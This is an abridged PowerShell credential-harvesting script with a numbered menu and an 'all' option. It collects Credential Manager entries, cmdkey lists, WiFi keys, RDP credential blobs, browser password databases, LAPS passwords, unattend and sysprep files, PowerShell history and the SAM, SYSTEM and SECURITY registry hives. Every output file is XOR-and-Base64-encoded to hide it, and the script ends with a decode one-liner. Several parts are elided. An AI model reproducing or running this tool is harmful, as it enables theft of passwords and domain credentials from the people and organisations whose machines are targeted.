...
function xor-encode($Path, $Key = 0x42) {
...
function Func-CredManager {
    ...
    try {
        ...
        if (Test-Path "$outputDir\credman_all.csv") { xor-encode "$outputDir\credman_all.csv" }
        Write-Host "[+] Saved (XOR+Base64)" -ForegroundColor Green
    } catch {}
}
...
function Func-CmdKey {
    ...
    if (Test-Path "$outputDir\cmdkey_list.txt") { xor-encode "$outputDir\cmdkey_list.txt" }
    Write-Host "[+] Saved (XOR+Base64)" -ForegroundColor Green
}
...
function Func-WiFi {
    ...
    (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
        ...
        if($key){ [PSCustomObject]@{Profile=$name; Password=$key.Matches.Groups[1].Value.Trim()} | Export-Csv $wifiOut -Append -NoTypeInformation }
    }
    if (Test-Path $wifiOut) { xor-encode $wifiOut }
    Write-Host "[+] Saved (XOR+Base64)" -ForegroundColor Green
}

function Func-RDP {
    Write-Host "[4] Hunting RDP Credentials..." -ForegroundColor Yellow
    Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials","$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -File -ErrorAction SilentlyContinue | Select FullName,Length,LastWriteTime | Export-Csv "$outputDir\cred_blobs.csv" -NoTypeInformation
    reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null | Out-File "$outputDir\rdp_servers.reg.txt"
    if (Test-Path "$outputDir\cred_blobs.csv") { xor-encode "$outputDir\cred_blobs.csv" }
    if (Test-Path "$outputDir\rdp_servers.reg.txt") { xor-encode "$outputDir\rdp_servers.reg.txt" }
    Write-Host "[+] Saved (XOR+Base64)" -ForegroundColor Green
}

function Func-Browsers {
    Write-Host "[5] Dumping Browser Passwords..." -ForegroundColor Yellow
    $browsers = @(
    ...
    foreach ($b in $browsers) {
        if (Test-Path $b.Path) {
            ...
            if ($b.Name -eq "Firefox") { Copy-Item $b.Path "$dest.json" -Force; xor-encode "$dest.json" }
            else { Copy-Item $b.Path "$dest.sqlite" -Force; xor-encode "$dest.sqlite" }
            Write-Host "[+] $($b.Name) copied & encoded" -ForegroundColor Green
        }
    }
}
...
function Func-LAPS {
    ...
    try {
        Get-ADComputer $env:COMPUTERNAME -Properties ms-Mcs-AdmPwd -ErrorAction Stop | Select -Expand ms-Mcs-AdmPwd | Out-File "$outputDir\laps.txt"
        if (Test-Path "$outputDir\laps.txt") { xor-encode "$outputDir\laps.txt"; Write-Host "[!] Found & encoded" -ForegroundColor Red }
    } catch {}
}
...
function Func-IE {
    ...
    if (Test-Path "$outputDir\ie_intelliforms.reg.txt") { xor-encode "$outputDir\ie_intelliforms.reg.txt" }
    Write-Host "[+] Saved (XOR+Base64)" -ForegroundColor Green
}
...
function Func-Unattended {
    ...
    Get-ChildItem -Path "$env:SystemDrive\","C:\Windows\Panther","C:\Windows\System32\sysprep" -Recurse -Include *.xml,*.txt,unattend*,sysprep* -ErrorAction SilentlyContinue |
        ...
        ForEach-Object { Copy-Item $_.FullName "$outputDir\unattend_$($_.Name)" -Force; xor-encode "$outputDir\unattend_$($_.Name)" }
    Write-Host "[+] Copied & encoded" -ForegroundColor Green
}

function Func-Recent {
    Write-Host "[9] Recent Activity..." -ForegroundColor Yellow
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Recurse -ErrorAction SilentlyContinue | Select FullName,LastWriteTime | Export-Csv "$outputDir\recent.csv" -NoTypeInformation
    ...
    xor-encode "$outputDir\recent.csv" -ErrorAction SilentlyContinue
    xor-encode "$outputDir\runmru.txt" -ErrorAction SilentlyContinue
    xor-encode "$outputDir\ps_history.txt" -ErrorAction SilentlyContinue
}
...
function Func-Hives {
    ...
    if (Test-Path "$outputDir\SAM") { xor-encode "$outputDir\SAM"; xor-encode "$outputDir\SYSTEM"; xor-encode "$outputDir\SECURITY"; Write-Host "[!] Saved & encoded" -ForegroundColor Red }
}
...
do {
    ...
    switch ($choice.ToUpper()) {
        ...
        '9' { Func-Recent }
        '10' { Func-Hives }
        'A' { Func-CredManager; Func-CmdKey; Func-WiFi; Func-RDP; Func-Browsers; Func-LAPS; Func-IE; Func-Unattended; Func-Recent; Func-Hives; Write-Host "`nEnumeration Complete!" -ForegroundColor Cyan }
        '0' { break }
    }
    if ($choice -ne '0') {
...
Write-Host @"
All files XOR-encoded (key=0x42) + Base64 → .xor64

Decode example:
$bytes = [Convert]::FromBase64String((Get-Content file.xor64)); for($i=0;$i-lt$bytes.Length;$i++){$bytes[$i]-bxor 0x42} | Set-Content -Path decoded.bin -Encoding Byte
